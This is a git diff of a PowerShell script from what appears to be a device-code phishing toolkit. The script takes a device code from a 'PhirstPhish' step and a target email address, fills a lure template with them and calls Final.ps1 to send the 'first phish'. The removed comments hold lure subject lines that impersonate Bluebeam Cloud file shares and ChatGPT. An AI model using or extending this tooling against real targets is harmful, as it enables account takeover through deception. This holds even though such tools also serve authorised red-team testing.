@@ -1,7 +1,7 @@
 [CmdletBinding()]
 param(
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$code,
+    [string]$userCode,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$subject,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
@@ -11,6 +11,7 @@ param(
 
 )
 
+$code = $userCode
 if(!($code)){ $code = Read-Host "Enter Device code from PhirstPhish step" }
 if(!($firstUser)){ $firstUser = Read-Host "Enter target email address"}
 
@@ -60,9 +61,6 @@ switch ($template) {
     }
 }
 
-# Further processing with $templatePath
-
-
 
 
 Write-Output "$template template selected. Replacing code."
@@ -70,29 +68,6 @@ Write-Output "$template template selected. Replacing code."
 
 $messageContent2 = Get-Content $templatePath -Raw
 
-# if($template = "bluebeam"){
-# $subjects = @(
-#     "A Bluebeam Cloud user has shared 'Big City Project: Key Details and Timeline' with you.",
-#     "A Bluebeam Cloud user has shared 'Invitation: Steakholder Meeting on Downtown Development Plans. B.Y.O.Beef' with you.",
-#     "A Bluebeam Cloud user has shared 'Progress Update: Where are the gay robots??' with you.",
-#     "A Bluebeam Cloud user has shared 'Performance Improvement Plan and General Guidelines.' with you."
-#     )
-# }
-
-# if($template = "chatgpt"){
-#     $subjects = @(
-#     "ChatGPT wants you back."
-#     )
-# }
-
-
-# if ($template -eq "blonde" -or $template -eq "fondo") {
-#     $subjects = @(
-#         "The Girls of Heavy Industry 2024."
-#     )
-# }
-
-
-
+Write-Output "Sending first phish."
 if(!($subject)){ $subject = Get-Random -InputObject $subjects} 
 .\Final.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject
